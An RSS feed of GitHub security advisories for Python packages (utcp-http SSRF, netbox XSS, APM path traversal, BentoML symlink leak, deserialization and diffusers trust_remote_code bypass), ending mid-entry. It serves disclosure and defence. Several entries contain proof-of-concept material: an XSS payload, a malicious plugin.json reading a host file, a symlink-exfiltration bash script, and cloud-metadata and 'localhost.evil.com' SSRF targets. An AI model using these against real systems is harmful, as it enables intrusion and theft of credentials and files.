<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/pip.rss</id>
    <title>Security Advisory for Python packages hosted at PyPI.org</title>
    <updated>2026-05-08T14:32:03.543Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"/>
    <subtitle>Security Advisory for Python packages hosted at PyPI.org on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[utcp-http] utcp-http vulnerable to SSRF via attacker-controlled OpenAPI servers[0].url in HTTP communication protocol]]></title>
        <id>https://github.com/advisories/GHSA-39j6-4867-gg4w</id>
        <link href="https://github.com/advisories/GHSA-39j6-4867-gg4w"/>
        <updated>2026-05-07T22:32:55.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>The <code>utcp-http</code> plugin is vulnerable to a blind Server-Side Request Forgery (SSRF) caused by a trust-boundary inconsistency between manual discovery and tool invocation. <code>register_manual()</code> validates the discovery URL against an HTTPS / loopback allowlist, but <code>call_tool()</code> and <code>call_tool_streaming()</code> reuse the resolved <code>tool_call_template.url</code> directly without revalidating. An attacker who hosts a malicious OpenAPI spec on a legitimate HTTPS endpoint can declare <code>servers: [{ url: "http://169.254.169.254" }]</code> (or any internal address) in the spec; the OpenAPI converter blindly trusts that value and the tool becomes a blind SSRF primitive that exposes cloud metadata, internal services, and other firewalled-only endpoints to the LLM caller.</p>
<p>All three HTTP-class protocols (<code>utcp_http.http</code>, <code>utcp_http.streamable_http</code>, <code>utcp_http.sse</code>) shared the same gap, plus a separate prefix-bypass: the previous <code>startswith("http://localhost")</code> check let URLs like <code>http://localhost.evil.com</code> through.</p>
<h2 id="impact">Impact</h2>
<p>A remote attacker who can convince the agent (via the LLM context, prompt injection, or a tool-discovery surface) to register their HTTPS OpenAPI URL can:</p>
<ul>
<li>Map internal networks behind the agent.</li>
<li>Read AWS/GCP IAM credentials from cloud metadata endpoints (<code>http://169.254.169.254</code>, <code>http://metadata.google.internal</code>).</li>
<li>Reach unauthenticated internal services (Elasticsearch, Redis HTTP, internal admin panels).</li>
<li>Have responses returned to the LLM, which combined with prompt injection enables exfiltration back to the attacker.</li>
</ul>
<h2 id="affected-versions">Affected versions</h2>
<p><code>utcp-http &lt;= 1.1.1</code>.</p>
<h2 id="patched-versions">Patched versions</h2>
<p><code>utcp-http 1.1.2</code>.</p>
<h2 id="patch">Patch</h2>
<p>Commit: 5b16e43 on <code>dev</code>.</p>
<ul>
<li>New <code>utcp_http._security</code> helper: <code>ensure_secure_url(url, context=...)</code> parses the URL with <code>urllib.parse.urlparse</code> and validates the hostname (not a string prefix) against the loopback set, closing the <code>localhost.evil.com</code> bypass.</li>
<li>All three protocols call <code>ensure_secure_url(url, context="manual discovery")</code> in <code>register_manual</code> (replacing the duplicated prefix check) and <code>ensure_secure_url(url, context="tool invocation")</code> immediately before each aiohttp request in <code>call_tool</code> / <code>call_tool_streaming</code>. The runtime check is the actual SSRF fix.</li>
<li>New regression tests in <code>test_security.py</code> pin the accept/reject decisions and explicitly cover the historical bypass cases.</li>
</ul>
<h2 id="workarounds">Workarounds</h2>
<p>For users who cannot upgrade immediately:</p>
<ul>
<li>Refuse to call <code>register_manual</code> with any URL controlled by an untrusted party, even over HTTPS.</li>
<li>Restrict outbound network access from the host running the agent so internal addresses (RFC1918, 169.254.0.0/16, loopback for cloud metadata) are unreachable.</li>
</ul>
<h2 id="credit">Credit</h2>
<p>Discovered and reported by <a href="https://github.com/YLChen-007">@YLChen-007</a> in #83.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/universal-tool-calling-protocol/python-utcp/security/advisories/GHSA-39j6-4867-gg4w">https://github.com/universal-tool-calling-protocol/python-utcp/security/advisories/GHSA-39j6-4867-gg4w</a></li>
<li><a href="https://github.com/advisories/GHSA-39j6-4867-gg4w">https://github.com/advisories/GHSA-39j6-4867-gg4w</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-39j6-4867-gg4w</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-07T22:32:54.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[netbox-data-flows] netbox-data-flows has stored XSS in ObjectAlias names rendered inside DataFlow tables]]></title>
        <id>https://github.com/advisories/GHSA-v7qw-hx66-4w9x</id>
        <link href="https://github.com/advisories/GHSA-v7qw-hx66-4w9x"/>
        <updated>2026-05-07T22:31:37.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>An authenticated user who can create or edit <code>ObjectAlias</code> objects can store arbitrary HTML/JavaScript in an alias name. That payload is later rendered unescaped in <code>DataFlow</code> table views, causing a stored XSS when another user views the affected page.</p>
<h3 id="details">Details</h3>
<p>The issue is caused by unsafe HTML generation in the plugin’s custom table column renderer.</p>
<p>Relevant code on <code>main</code> (<code>bf96eac</code>, same commit as <code>origin/main</code> at the time of review):</p>
<ul>
<li><code>netbox_data_flows/models/objectaliases.py</code><ul>
<li><code>ObjectAlias.name</code> is user-controlled (<code>CharField</code>)</li>
<li><code>ObjectAlias.__str__()</code> returns <code>self.name</code> directly</li>
</ul>
</li>
<li><code>netbox_data_flows/tables/dataflows.py</code><ul>
<li><code>DataFlowTable.sources</code> and <code>DataFlowTable.destinations</code> use <code>ObjectAliasListColumn</code></li>
</ul>
</li>
<li><code>netbox_data_flows/tables/columns.py</code><ul>
<li><code>ObjectAliasListColumn.render()</code> calls <code>object_list_to_string(value.all(), linkify=True)</code></li>
</ul>
</li>
<li><code>netbox_data_flows/utils/helpers.py</code><ul>
<li><code>object_list_to_string()</code> builds raw anchor tags with:<pre><code class="language-python">mark_safe(separator.join(f'&lt;a href="{o.get_absolute_url()}"&gt;{o}&lt;/a&gt;' for o in objects))
</code></pre>
</li>
</ul>
</li>
</ul>
<p>The alias text (<code>{o}</code>) is inserted into HTML without escaping, then the whole string is marked safe. Because <code>ObjectAlias.__str__()</code> returns the user-supplied name, HTML/JS in the alias name is executed in the victim’s browser.</p>
<p>This affects any page rendering <code>DataFlowTable</code>, including at least:</p>
<ul>
<li>the main Data Flow list page</li>
<li>model tabs that reuse <code>DataFlowTable</code></li>
</ul>
<h3 id="poc">PoC</h3>
<p>Environment:</p>
<ul>
<li>NetBox with <code>netbox-data-flows</code> installed</li>
<li>No special plugin configuration required</li>
</ul>
<p>Steps:</p>
<ol>
<li>Log in as a user with permission to create or edit <code>ObjectAlias</code> and <code>DataFlow</code>.</li>
<li>Create a new <code>ObjectAlias</code> with the following name:<pre><code class="language-html">&lt;img src=x onerror=alert(document.domain)&gt;
</code></pre>
</li>
<li>Create or edit a <code>DataFlow</code> so this alias is present in either <code>sources</code> or <code>destinations</code>.</li>
<li>Log in as another user and open the Data Flow list page in the plugin UI.</li>
<li>The JavaScript executes when the table renders the alias list.</li>
</ol>
<p>A simple path to trigger is the Data Flow list page. Any other page that renders <code>DataFlowTable</code> should also be tested.</p>
<h3 id="impact">Impact</h3>
<p>This is a stored cross-site scripting vulnerability.</p>
<p>Impacted users:</p>
<ul>
<li>any authenticated user who can view a page rendering the affected <code>DataFlow</code> table</li>
<li>especially higher-privileged NetBox users, because an attacker with lower privileges may target them by planting a malicious alias name</li>
</ul>
<p>Possible impact:</p>
<ul>
<li>session theft</li>
<li>execution of privileged actions in the victim’s session</li>
<li>exfiltration of data visible to the victim in NetBox</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/Alef-Burzmali/netbox-data-flows/security/advisories/GHSA-v7qw-hx66-4w9x">https://github.com/Alef-Burzmali/netbox-data-flows/security/advisories/GHSA-v7qw-hx66-4w9x</a></li>
<li><a href="https://github.com/advisories/GHSA-v7qw-hx66-4w9x">https://github.com/advisories/GHSA-v7qw-hx66-4w9x</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-v7qw-hx66-4w9x</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-07T22:31:32.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[apm-cli] Microsoft APM CLI's plugin.json component paths escape plugin root and copy arbitrary host files during install]]></title>
        <id>https://github.com/advisories/GHSA-xhrw-5qxx-jpwr</id>
        <link href="https://github.com/advisories/GHSA-xhrw-5qxx-jpwr"/>
        <updated>2026-05-07T21:41:09.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Microsoft APM normalizes marketplace plugins by copying plugin components referenced in <code>plugin.json</code> into <code>.apm/</code>. The manifest fields <code>agents</code>, <code>skills</code>, <code>commands</code>, and <code>hooks</code> are attacker-controlled, but the implementation does not enforce that those paths remain inside the plugin directory. A malicious plugin can therefore use absolute paths or <code>../</code> traversal paths to copy arbitrary readable host files or directories from the installer's machine during <code>apm install</code>.</p>
<p>In the verified primary proof of concept, a malicious plugin sets <code>plugin.json.commands</code> to an external markdown file. A single <code>apm install</code> copies that outside file into <code>.apm/prompts/</code> and then auto-integrates it into <code>.github/prompts/secret.prompt.md</code> in the victim project. This is a local supply-chain trust-boundary violation with direct confidentiality and integrity impact.</p>
<p>Reviewed version and commit:</p>
<ul>
<li><code>apm-cli</code> version <code>0.8.11</code></li>
<li><code>main</code> commit <code>70b34faa16a5a783424698163deeb028854fd23a</code></li>
</ul>
<h3 id="details">Details</h3>
<p>Root cause:</p>
<ul>
<li><code>src/apm_cli/deps/plugin_parser.py:336-348</code><ul>
<li><code>_resolve_sources()</code> joins manifest-controlled <code>agents</code>, <code>skills</code>, <code>commands</code>, and directory-form <code>hooks</code> paths with <code>plugin_path</code></li>
<li>it checks only <code>exists()</code> and <code>is_symlink()</code></li>
<li>it does not resolve the candidate and verify containment inside the plugin root</li>
</ul>
</li>
<li><code>src/apm_cli/deps/plugin_parser.py:356-395</code><ul>
<li>copies attacker-selected agent and skill files/directories into <code>.apm/</code></li>
</ul>
</li>
<li><code>src/apm_cli/deps/plugin_parser.py:397-452</code><ul>
<li>copies attacker-selected command and hook files/directories into <code>.apm/</code></li>
</ul>
</li>
<li><code>src/apm_cli/deps/plugin_parser.py:436-442</code><ul>
<li>string-form hook config paths are also copied without a root-containment check</li>
</ul>
</li>
</ul>
<p>There is already a safer precedent in the same module:</p>
<ul>
<li><code>src/apm_cli/deps/plugin_parser.py:195-210</code><ul>
<li><code>_read_mcp_file()</code> resolves the candidate path</li>
<li>rejects paths escaping the plugin root</li>
<li>rejects symlinks</li>
</ul>
</li>
</ul>
<p>Reachability:</p>
<ul>
<li>Local install path:<ul>
<li><code>src/apm_cli/commands/install.py:2007-2015</code></li>
<li>local marketplace plugins are normalized through <code>normalize_plugin_directory(...)</code></li>
</ul>
</li>
<li>Remote install path:<ul>
<li><code>src/apm_cli/deps/github_downloader.py:2224-2230</code></li>
<li>downloaded packages are validated through <code>validate_apm_package(target_path)</code></li>
<li><code>src/apm_cli/models/validation.py:164-172</code>, <code>224-226</code>, <code>304-324</code></li>
<li>marketplace plugins are normalized through the same vulnerable path after clone</li>
</ul>
</li>
</ul>
<p>Project write-back path:</p>
<ul>
<li><code>src/apm_cli/integration/prompt_integrator.py:38-56</code><ul>
<li>reads <code>.apm/prompts/*.prompt.md</code></li>
</ul>
</li>
<li><code>src/apm_cli/integration/prompt_integrator.py:170-189</code><ul>
<li>writes prompt files into <code>.github/prompts/</code></li>
</ul>
</li>
<li><code>src/apm_cli/commands/install.py:2496-2514</code><ul>
<li>auto-integrates package primitives after install</li>
</ul>
</li>
</ul>
<p>This means a malicious dependency can cause APM to read from outside the dependency itself and materialize host-local content into managed install output and, in the verified prompt case, directly into the victim project.</p>
<h3 id="poc">PoC</h3>
<p>The attached zip contains a complete maintainer-ready proof-of-concept package, including runnable scripts, payload templates, captured output, and the exact validation environment.</p>
<p>Primary end-to-end <code>apm install</code> reproduction:</p>
<ol>
<li>Install APM from the reviewed source tree (<code>apm-cli 0.8.11</code>, commit <code>70b34faa16a5a783424698163deeb028854fd23a</code>) into a Python environment.</li>
<li>Create an external file outside the malicious plugin directory, for example:</li>
</ol>
<pre><code class="language-text">victim\secret.md
</code></pre>
<p>with content:</p>
<pre><code class="language-md"># STOLEN VIA APM INSTALL
</code></pre>
<ol start="3">
<li>Create a malicious plugin with this minimal <code>plugin.json</code>:</li>
</ol>
<pre><code class="language-json">{
  "name": "evil-plugin",
  "commands": "D:\\absolute\\path\\to\\victim\\secret.md"
}
</code></pre>
<ol start="4">
<li>Create a minimal <code>apm.yml</code> that references the malicious plugin.</li>
<li>Run:</li>
</ol>
<pre><code class="language-powershell">apm install
</code></pre>
<ol start="6">
<li>Observe that APM completes successfully and writes:</li>
</ol>
<pre><code class="language-text">.github/prompts/secret.prompt.md
</code></pre>
<ol start="7">
<li>Observe that the resulting prompt file contains the external host file content:</li>
</ol>
<pre><code class="language-md"># STOLEN VIA APM INSTALL
</code></pre>
<p>Verified console output from the included PoC:</p>
<pre><code class="language-text">[&gt;] Installing dependencies from apm.yml...
  [+] ./evil-plugin (local)
  |-- 1 prompts integrated -&gt; .github/prompts/

[*] Installed 1 APM dependency.
PoC succeeded.
Integrated into project: ...\.github\prompts\secret.prompt.md
Integrated content:
# STOLEN VIA APM INSTALL
</code></pre>
<p>Secondary remote-parity reproduction:</p>
<ul>
<li>The attached <code>reproduce-remote-parity.py</code> exercises <code>GitHubPackageDownloader.download_package(...)</code> after clone by replacing only the clone callback to keep the test self-contained.</li>
<li>It confirms the same unsafe normalization path copies an outside host file into:</li>
</ul>
<pre><code class="language-text">&lt;download-target&gt;/.apm/prompts/secret.prompt.md
</code></pre>
<h3 id="impact">Impact</h3>
<p>This is a path traversal / arbitrary local file copy issue in the package install flow.</p>
<p>Who is impacted:</p>
<ul>
<li>any user who runs <code>apm install</code> against a malicious or compromised plugin dependency</li>
<li>both direct and transitive dependency consumers</li>
</ul>
<p>What an attacker gains:</p>
<ul>
<li>ability to copy arbitrary readable host files into <code>.apm/</code> during install</li>
<li>ability to copy arbitrary readable host directories recursively into <code>.apm/</code></li>
<li>ability to trigger project write-back when the copied content lands in supported primitive locations such as <code>.apm/prompts/</code></li>
</ul>
<p>Practical impact:</p>
<ul>
<li>local notes, markdown, source material, or configuration files can be staged into repository-controlled paths</li>
<li>copied prompt files are automatically written into <code>.github/prompts/</code>, increasing the chance that sensitive or attacker-selected content is committed, synced, or consumed by other tooling</li>
<li>the issue breaks the expected trust boundary that a dependency install should copy only content belonging to the dependency itself</li>
</ul>
<h3 id="mitigation">Mitigation</h3>
<p>Recommended fix:</p>
<ol>
<li>Resolve every manifest-controlled component path against <code>plugin_path.resolve()</code>.</li>
<li>Reject absolute or relative paths that escape the plugin root.</li>
<li>Apply the same containment check to <code>agents</code>, <code>skills</code>, <code>commands</code>, and both <code>hooks</code> code paths.</li>
<li>Reject symlinks before copying.</li>
<li>Add regression tests for:<ul>
<li>absolute file path in <code>commands</code></li>
<li>absolute directory path in <code>commands</code></li>
<li><code>../</code> traversal in <code>agents</code></li>
<li><code>../</code> traversal in <code>skills</code></li>
<li><code>../</code> traversal in <code>hooks</code></li>
<li>confirmation that only in-root files remain accepted</li>
</ul>
</li>
</ol>
<h3 id="attachment">Attachment</h3>
<p><a href="https://github.com/user-attachments/files/26829524/Microsoft_APM_Plugin_Path_Escape_Report_Final.zip">Microsoft_APM_Plugin_Path_Escape_Report_Final.zip</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/microsoft/apm/security/advisories/GHSA-xhrw-5qxx-jpwr">https://github.com/microsoft/apm/security/advisories/GHSA-xhrw-5qxx-jpwr</a></li>
<li><a href="https://github.com/advisories/GHSA-xhrw-5qxx-jpwr">https://github.com/advisories/GHSA-xhrw-5qxx-jpwr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xhrw-5qxx-jpwr</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-07T21:41:08.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[sglang] SGLang has an Improper Input Validation/Injection Issue]]></title>
        <id>https://github.com/advisories/GHSA-6m5f-673f-5vh7</id>
        <link href="https://github.com/advisories/GHSA-6m5f-673f-5vh7"/>
        <updated>2026-05-07T21:09:30.000Z</updated>
        <content type="html"><![CDATA[<p>A vulnerability was detected in sgl-project SGLang up to 0.5.9. Impacted is the function get_tokenizer of the file python/sglang/srt/utils/hf_transformers_utils.py of the component HuggingFace Transformer Handler. The manipulation results in deserialization. The attack can be executed remotely. A high complexity level is associated with this attack. The exploitability is considered difficult. The vendor was contacted early about this disclosure but did not respond in any way.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-7669">https://nvd.nist.gov/vuln/detail/CVE-2026-7669</a></li>
<li><a href="https://vuldb.com/submit/799263">https://vuldb.com/submit/799263</a></li>
<li><a href="https://vuldb.com/vuln/360817">https://vuldb.com/vuln/360817</a></li>
<li><a href="https://vuldb.com/vuln/360817/cti">https://vuldb.com/vuln/360817/cti</a></li>
<li><a href="https://github.com/gouldnicholas/CVE-2026-7669-PoC">https://github.com/gouldnicholas/CVE-2026-7669-PoC</a></li>
<li><a href="https://github.com/advisories/GHSA-6m5f-673f-5vh7">https://github.com/advisories/GHSA-6m5f-673f-5vh7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6m5f-673f-5vh7</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-03T00:31:37.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[mem0ai] mem0ai mem0 has an Improper Input Validation Issue]]></title>
        <id>https://github.com/advisories/GHSA-xqxw-r767-67m7</id>
        <link href="https://github.com/advisories/GHSA-xqxw-r767-67m7"/>
        <updated>2026-05-07T20:47:22.000Z</updated>
        <content type="html"><![CDATA[<p>A vulnerability was found in mem0ai mem0 up to 1.0.11. This affects the function pickle.load/pickle.dump of the file mem0/vector_stores/faiss.py. Performing a manipulation results in deserialization. It is possible to initiate the attack remotely. The exploit has been made public and could be used. The patch is named 62dca096f9236010ca15fea9ba369ba740b86b7a. Applying a patch is the recommended action to fix this issue.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-7597">https://nvd.nist.gov/vuln/detail/CVE-2026-7597</a></li>
<li><a href="https://github.com/mem0ai/mem0/issues/3778">https://github.com/mem0ai/mem0/issues/3778</a></li>
<li><a href="https://github.com/mem0ai/mem0/pull/4833">https://github.com/mem0ai/mem0/pull/4833</a></li>
<li><a href="https://github.com/mem0ai/mem0/commit/62dca096f9236010ca15fea9ba369ba740b86b7a">https://github.com/mem0ai/mem0/commit/62dca096f9236010ca15fea9ba369ba740b86b7a</a></li>
<li><a href="https://github.com/mem0ai/mem0">https://github.com/mem0ai/mem0</a></li>
<li><a href="https://vuldb.com/submit/805562">https://vuldb.com/submit/805562</a></li>
<li><a href="https://vuldb.com/vuln/360550">https://vuldb.com/vuln/360550</a></li>
<li><a href="https://vuldb.com/vuln/360550/cti">https://vuldb.com/vuln/360550/cti</a></li>
<li><a href="https://github.com/advisories/GHSA-xqxw-r767-67m7">https://github.com/advisories/GHSA-xqxw-r767-67m7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xqxw-r767-67m7</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2026-05-02T00:31:21.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[bentoml] BentoML has Information Disclosure in `bentoml build` via symlink traversal in the build context]]></title>
        <id>https://github.com/advisories/GHSA-mcfx-4vc6-qgxv</id>
        <link href="https://github.com/advisories/GHSA-mcfx-4vc6-qgxv"/>
        <updated>2026-05-07T16:39:49.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>BentoML's <code>bentoml build</code> packaging workflow follows attacker-controlled symlinks inside the build context and copies the referenced file contents into the generated Bento artifact.</p>
<p>If a victim builds an untrusted repository or other attacker-supplied build context, the attacker can place a symlink such as <code>loot.txt -&gt; /tmp/outside-marker.txt</code> or a link to a more sensitive local file. When <code>bentoml build</code> runs, BentoML dereferences the symlink and packages the target file contents into the Bento. The leaked file can then propagate further through export, push, or containerization workflows.</p>
<h3 id="details">Details</h3>
<p>The vulnerable code walks files under the build context and copies each matched entry into the Bento source directory:</p>
<pre><code class="language-python">for root, _, files in os.walk(ctx_path):
    for f in files:
        dir_path = os.path.relpath(root, ctx_path)
        path = os.path.join(dir_path, f).replace(os.sep, "/")
        if specs.includes(path):
            src_file = ctx_path.joinpath(path)
            dst_file = target_fs.joinpath(dest_path)
            shutil.copy(src_file, dst_file)
</code></pre>
<p>There is no validation that the resolved path of <code>src_file</code> remains inside <code>ctx_path</code> before <code>shutil.copy</code> dereferences the source path. As a result, a repository-controlled symlink can cross the trust boundary from <code>attacker-controlled repository content</code> to <code>developer/CI host filesystem</code> during the build process.</p>
<p>This is a build-time path traversal / symlink traversal issue in the packaging feature, not a runtime API issue. The resulting Bento may later be exported, pushed to remote storage, or converted into a container image, which amplifies the leakage impact.</p>
<h3 id="poc">PoC</h3>
<p>The issue was verified in WSL against BentoML 1.4.38. The following script reproduces the vulnerability by using a harmless marker file outside the build directory.</p>
<pre><code class="language-bash">mkdir -p /tmp/bento-symlink-poc
cd /tmp/bento-symlink-poc

printf 'BENTOML_SYMLINK_POC_123456\n' &gt; /tmp/outside-marker.txt

cat &gt; service.py &lt;&lt;'EOF'
import bentoml

@bentoml.service
class Demo:
    @bentoml.api
    def ping(self, x: str) -&gt; str:
        return x
EOF

cat &gt; bentofile.yaml &lt;&lt;'EOF'
service: "service:Demo"
include:
  - "service.py"
  - "loot.txt"
EOF

ln -s /tmp/outside-marker.txt loot.txt

bentoml build --output tag
bentoml export demo:7pilrpjtlomelwct /tmp/poc.zip

mkdir -p /tmp/poc-unzip
unzip -o /tmp/poc.zip -d /tmp/poc-unzip
find /tmp/poc-unzip -name loot.txt -print
cat /tmp/poc-unzip/**/src/loot.txt 2&gt;/dev/null || \
find /tmp/poc-unzip -path '*/src/loot.txt' -exec cat {} \;
</code></pre>
<ul>
<li><p>The script creates <code>/tmp/outside-marker.txt</code> outside the build context as a stand-in for a sensitive local file.</p>
</li>
<li><p>It creates a minimal BentoML service and explicitly includes <code>loot.txt</code> in <code>bentofile.yaml</code>.</p>
</li>
<li><p>It creates <code>loot.txt</code> as a symlink to the external marker file.</p>
<img width="1531" height="648" alt="image" src="https://github.com/user-attachments/assets/1312dcf0-74b0-4fb6-a05d-b68644470d82">
</li>
<li><p>It runs <code>bentoml build</code>, exports the generated Bento, unzips it, and reads the packaged <code>src/loot.txt</code>.</p>
</li>
<li><p>Successful exploitation is confirmed when the packaged file contains <code>BENTOML_SYMLINK_POC_123456</code>, proving that BentoML copied the external file contents rather than keeping only the symlink.</p>
<img width="1315" height="121" alt="image" src="https://github.com/user-attachments/assets/6ed34f51-9b68-4fa9-8a42-011deb84d54e"></li>
</ul>
<img width="1697" height="760" alt="image" src="https://github.com/user-attachments/assets/9b8a8ae5-4f06-46b4-9e4a-dee25cc5d203">


<h3 id="impact">Impact</h3>
<p>An attacker who can cause a developer, release engineer, or CI system to run <code>bentoml build</code> on an attacker-controlled repository can exfiltrate local files from the build host into the Bento artifact.</p>
<p>This can expose secrets such as cloud credentials, SSH keys, API tokens, environment files, or other sensitive local configuration. Because Bento artifacts are commonly exported, uploaded, stored, or containerized after build, the leaked file contents can spread beyond the original build machine.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/bentoml/BentoML/security/advisories/GHSA-mcfx-4vc6-qgxv">https://github.com/bentoml/BentoML/security/advisories/GHSA-mcfx-4vc6-qgxv</a></li>
<li><a href="https://github.com/advisories/GHSA-mcfx-4vc6-qgxv">https://github.com/advisories/GHSA-mcfx-4vc6-qgxv</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mcfx-4vc6-qgxv</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-07T16:39:47.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[smolagents] Hugging Face smolagents: Unsafe deserialization in Remote Python Executor leads to RCE]]></title>
        <id>https://github.com/advisories/GHSA-q9r5-6hrr-9ph7</id>
        <link href="https://github.com/advisories/GHSA-q9r5-6hrr-9ph7"/>
        <updated>2026-05-07T05:44:45.000Z</updated>
        <content type="html"><![CDATA[<p>Hugging Face smolagents Remote Python Executor Deserialization of Untrusted Data Remote Code Execution Vulnerability. This vulnerability allows remote attackers to execute arbitrary code on affected installations of Hugging Face smolagents. Authentication is not required to exploit this vulnerability.</p>
<p>The specific flaw exists within the parsing of pickle data. The issue results from the lack of proper validation of user-supplied data, which can result in deserialization of untrusted data. An attacker can leverage this vulnerability to execute code in the context of the service account. Was ZDI-CAN-28312.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-14931">https://nvd.nist.gov/vuln/detail/CVE-2025-14931</a></li>
<li><a href="https://www.zerodayinitiative.com/advisories/ZDI-25-1143">https://www.zerodayinitiative.com/advisories/ZDI-25-1143</a></li>
<li><a href="https://github.com/advisories/GHSA-q9r5-6hrr-9ph7">https://github.com/advisories/GHSA-q9r5-6hrr-9ph7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-q9r5-6hrr-9ph7</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2025-12-23T21:30:29.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[diffusers] Diffusers has a `trust_remote_code` bypass via `custom_pipeline` and local custom components]]></title>
        <id>https://github.com/advisories/GHSA-98h9-4798-4q5v</id>
        <link href="https://github.com/advisories/GHSA-98h9-4798-4q5v"/>
        <updated>2026-05-07T05:31:19.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>A <code>trust_remote_code</code> bypass in <code>DiffusionPipeline.from_pretrained</code> allows arbitrary remote code execution despite the user passing <code>trust_remote_code=False</code> (or omitting it, which is the default). The vulnerability has three variants, all sharing the same root cause — the <code>trust_remote_code</code> gate was implemented inside <code>DiffusionPipeline.download()</code> rather than at the actual dynamic-module load site, so any code path that bypassed or short-circuited <code>download()</code> also bypassed the security check:</p>
<ol>
<li><strong>Cross-repo <code>custom_pipeline</code>.</strong> <code>DiffusionPipeline.from_pretrained('repoA', custom_pipeline='attacker/repoB', trust_remote_code=False)</code> — the gate evaluated against <code>repoA</code>'s file list rather than <code>repoB</code>'s, so <code>repoB</code>'s <code>pipeline.py</code> was loaded and executed.</li>
<li><strong>Local snapshot + Hub <code>custom_pipeline</code>.</strong> <code>DiffusionPipeline.from_pretrained('/local/snapshot', custom_pipeline='attacker/repoB', trust_remote_code=False)</code> — the local-path branch never invoked <code>download()</code>, so the gate was never reached and remote code from <code>repoB</code> executed.</li>
<li><strong>Local snapshot with custom components.</strong> <code>DiffusionPipeline.from_pretrained('/local/snapshot', trust_remote_code=False)</code> where the snapshot contains custom component files (e.g. <code>unet/my_unet_model.py</code>) referenced from <code>model_index.json</code> — same root cause; the local path skipped <code>download()</code> and custom component code executed.</li>
</ol>
<p>Silent remote code execution on the victim's machine. Anyone calling <code>DiffusionPipeline.from_pretrained</code> with custom pipelines is impacted.</p>
<h3 id="patches">Patches</h3>
<p>Yes. Fixed in <strong>diffusers 0.38.0</strong> via <a href="https://github.com/huggingface/diffusers/pull/13448">PR #13448</a>. All users on versions <code>&lt; 0.38.0</code> should upgrade:</p>
<pre><code class="language-bash">pip install --upgrade "diffusers&gt;=0.38.0"
</code></pre>
<p>The fix moves the <code>trust_remote_code</code> gate out of <code>DiffusionPipeline.download()</code> and into <code>get_cached_module_file</code> in <code>src/diffusers/utils/dynamic_modules_utils.py</code>, which is the actual chokepoint for every dynamic module load (local, Hub, or community mirror). All three variants now raise <code>ValueError</code> instead of executing untrusted code.</p>
<h3 id="workarounds">Workarounds</h3>
<p>If upgrading immediately is not possible:</p>
<ul>
<li>Only call <code>from_pretrained</code> with <code>pretrained_model_name_or_path</code>, <code>custom_pipeline</code>, and local snapshot directories from fully trusted sources that have been audited.</li>
<li>Do not pass <code>custom_pipeline=</code> pointing at a Hub repository different from the primary <code>pretrained_model_name_or_path</code> before reading its <code>pipeline.py</code>.</li>
<li>Before calling <code>from_pretrained</code> on a local snapshot, inspect the snapshot for unexpected <code>*.py</code> files, especially under component subdirectories (<code>unet/</code>, <code>scheduler/</code>, etc.) and at the snapshot root.</li>
</ul>
<p>These are mitigations, not fixes — the only complete remediation is upgrading to 0.38.0.</p>
<h3 id="resources">Resources</h3>
<ul>
<li><strong>Fix:</strong> <a href="https://github.com/huggingface/diffusers/pull/13448">https://github.com/huggingface/diffusers/pull/13448</a></li>
<li><strong>Original issue:</strong> <a href="https://github.com/huggingface/diffusers/issues/13446">https://github.com/huggingface/diffusers/issues/13446</a></li>
